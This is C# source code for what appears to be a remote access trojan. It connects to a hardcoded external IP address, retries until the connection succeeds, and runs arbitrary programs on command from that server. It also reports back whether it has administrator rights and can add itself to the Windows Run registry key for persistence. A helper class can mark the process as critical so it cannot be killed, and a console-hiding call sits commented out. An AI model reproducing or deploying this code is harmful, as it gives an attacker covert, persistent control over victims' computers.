using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Ytah
{
    public static class Unkillable
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        public static bool isadmin = false;
        public static void MakeProcessUnkillable()
        {
            try
            {
                Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
                isadmin = true;
            }
            catch
            {
                isadmin = false;
            }
        }

        public static void MakeProcessKillable()
        {
            RtlSetProcessIsCritical(0, 0, 0);
        }
    }
      

    class Program
    {
         static void SetStartup()
        {
            try
            {

            
                var GetDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("aldwin", "\"" + GetDirectory + "\"");
                }
            }
            catch
            {

            }


        }
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static void Connect(TcpClient client, IPAddress ip, int port)
        {
            client.Connect(ip, port);
        }

        static void Main(string[] args)
        {
            //var handle = GetConsoleWindow();


            //ShowWindow(handle, SW_HIDE);
            IPAddress ip = IPAddress.Parse("78.114.52.238");
            int port = 5000;
            TcpClient client = new TcpClient();
            co:
            try
            {
                while(client.Connected == false)
                {
                    Connect(client, ip, port);
                    Console.WriteLine("Connecté");
                    if(client.Connected == false)
                    {
                        Thread.Sleep(1000);
                    }
                    
                }

            
            }
            catch
            {
                if(client.Connected == false)
                {
                    Console.WriteLine("Cant connect");
                    goto co;
                }
                else
                {

                }
            }

            NetworkStream ns = client.GetStream();
            Thread thread = new Thread(o => ReceiveData((TcpClient)o));

            thread.Start(client);
            //try
            //{
            //    Unkillable.MakeProcessUnkillable();
            //    byte[] b = Encoding.ASCII.GetBytes("Connected as admin");
            //    ns.Write(b, 0, b.Length);
            //}
            //catch
            //{
            //    byte[] b = Encoding.ASCII.GetBytes("Do not have user rights");
            //    ns.Write(b, 0, b.Length);
            //}

        }

        static void ReceiveData(TcpClient client)
        {
            NetworkStream ns = client.GetStream();
            byte[] receivedBytes = new byte[1024];
            int byte_count;
            while ((byte_count = ns.Read(receivedBytes, 0, receivedBytes.Length)) > 0)
            {
               string d = Encoding.ASCII.GetString(receivedBytes, 0, byte_count);
                byte[] buffer = Encoding.ASCII.GetBytes("");
                Console.WriteLine(d);
                if (d == "grights"){
                    bool isElevated;
                    using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                    {
                        WindowsPrincipal principal = new WindowsPrincipal(identity);
                        isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
                    }
                    buffer = Encoding.ASCII.GetBytes(isElevated.ToString());
                    ns.Write(buffer, 0, buffer.Length);             
                }
                if (d.Contains("SP"))
                {
                    string[] data = d.Split('|');
                    try
                    {
                        Process p = Process.Start(data[1]);
                        buffer = Encoding.ASCII.GetBytes("Done");
                        ns.Write(buffer, 0, buffer.Length);
                    }
                    catch(Exception e)
                    {
                        buffer = Encoding.ASCII.GetBytes("Failed");
                        ns.Write(buffer, 0, buffer.Length);
                        Console.WriteLine(e.ToString());
                    }                    
                }
            }
        }
    
    }
}
